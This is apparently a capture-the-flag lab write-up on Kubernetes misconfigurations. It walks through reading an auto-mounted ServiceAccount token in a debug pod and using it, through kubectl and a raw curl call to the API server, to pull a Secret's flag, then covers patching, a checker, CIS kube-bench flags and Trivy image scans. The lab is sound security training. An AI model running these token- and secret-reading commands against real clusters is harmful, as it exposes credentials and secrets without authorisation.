# K07 — Misconfigured and Vulnerable Cluster Components · NimbusMart CTF

**Difficulty:** Medium · **200 pts** · **Flag:** `FLAG{...}`

## Briefing
You have a shell in NimbusMart's `platform/debug-shell` pod. The platform team
never applied basic cluster hygiene to this namespace: the `default`
ServiceAccount still auto-mounts an API token into every pod, and someone bound
that `default` SA a Role that can read Secrets "so the debug tooling can read
its config". There are no ResourceQuota or LimitRange guardrails either. On top
of that the tool has never been on a patch cadence — it is pinned to a stale,
unsupported image and the storefront it debugs still runs a 2018-era nginx.
Your pod is holding a live cluster credential it never asked for.

**Objective:** use the auto-mounted `default` token to read the `platform-config`
Secret in the `platform` namespace and capture the flag it holds.

## Capture the flag
```bash
# Seed the target (secret + RBAC) and deploy the vulnerable debug-shell
kubectl apply -f setup.yaml
kubectl apply -f vulnerable.yaml

# The default-SA token was auto-mounted — the pod holds a live credential
kubectl exec -n platform debug-shell -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40; echo

# There are no resource guardrails (a DoS primitive)
kubectl get resourcequota,limitrange -n platform   # -> No resources found

# Use the auto-mounted token to read the secret -> flag
kubectl exec -n platform debug-shell -- \
  kubectl get secret platform-config -n platform -o jsonpath='{.data.flag}' | base64 -d; echo
#  -> FLAG{misconfigured_stale_cluster_component}

# Equivalent raw-API call with the same token (no kubectl needed):
#   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
#   curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
#     -H "Authorization: Bearer $TOKEN" \
#     https://kubernetes.default.svc/api/v1/namespaces/platform/secrets/platform-config
```

## Patch & verify
```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f fixed.yaml
# If the first apply reports 'serviceaccounts "default" already exists' (the
# control plane races to create the default SA on a new namespace), just re-run:
kubectl apply -f fixed.yaml

# The token is gone — no credential is handed out, so the secret is unreachable
kubectl exec -n platform debug-shell -- \
  ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1 || echo NO_TOKEN
# And the namespace now enforces guardrails
kubectl get resourcequota,limitrange -n platform

# Prove it with the checker
cd ../../checker && go run . --check k07 --namespace platform
```

## Cleanup
```bash
kubectl delete -f vulnerable.yaml -f fixed.yaml -f setup.yaml --ignore-not-found
```

## Two dimensions of K07

K07 (2025) merges two distinct-but-related weaknesses. The reproducible lab above
exercises the **misconfiguration** half; the **outdated / vulnerable component**
half is version- and image-currency work you drive with the tools below.

### 1. Misconfigured components (CIS Benchmark / kube-bench)

The lab focuses on the two reproducible, namespace-scoped misconfigurations
(default-SA token automount + missing quotas/limits). The full risk also covers
control-plane and node flags that you cannot easily change in kind at runtime.
These are exactly what the CIS Kubernetes Benchmark and
[kube-bench](https://github.com/aquasecurity/kube-bench) validate. Run
`kube-bench run --targets node,master` and check for:

**Kubelet (per node)**
- `--anonymous-auth=false` — reject unauthenticated requests to the kubelet API
  (port 10250). When true, anyone on the node network can exec into pods.
- `--authorization-mode=Webhook` — delegate authz to the API server instead of
  the permissive `AlwaysAllow`.
- `--read-only-port=0` — disable the unauthenticated read-only port (10255) that
  leaks pod specs, env vars, and metrics.
- `--client-ca-file` set — require client certificates.

**kube-apiserver**
- `--anonymous-auth=false` — do not admit anonymous (`system:anonymous`) requests.
- `--authorization-mode=Node,RBAC` — no `AlwaysAllow`.
- No legacy insecure port; serve TLS only (`--tls-cert-file` / `--tls-private-key-file`).
- `--encryption-provider-config` set — encrypt Secrets at rest.

**etcd**
- `--client-cert-auth=true` and `--peer-client-cert-auth=true` — require mutual
  TLS. An unauthenticated etcd endpoint exposes every Secret in plaintext.
- Keep etcd on an isolated network, never on a shared/public interface.

### 2. Outdated / vulnerable components (Trivy / version checks)

Stale software ships known CVEs straight into production. Two aspects:

**Container images** — the checker does NOT inspect image tags, so triage them
yourself. `debug-shell` is annotated with a legacy image reference and the
storefront still serves `nginx:1.14.0` (2018, EOL):
```bash
trivy image nginx:1.14.0            # long list of CRITICAL/HIGH CVEs (the vulnerable frontend)
trivy image nginx:1.27.4            # a current release — far shorter list
# In CI, gate builds so a fresh HIGH/CRITICAL CVE never ships:
trivy image --exit-code 1 --severity HIGH,CRITICAL registry.example.com/web:1.27.4
```

**Cluster & node versions** — this IS what the k07 checker validates. Kubernetes
supports only the three most recent minors; anything below the floor (**v1.28+**)
is end-of-life and unpatched:
```bash
kubectl version                     # client + server (control plane) version
kubectl get nodes -o wide           # VERSION column = each node's kubelet
```
On the local kind cluster the version floor is met, so this dimension PASSES
regardless of the (narrative-only) stale image references.

### Why it matters
Any one of these defaults or stale versions lets an attacker read secrets, exec
into pods, rewrite cluster state, or match a public CVE to a fingerprinted
component — so they belong in every cluster's benchmark scan and patch cadence,
not just per-workload review.
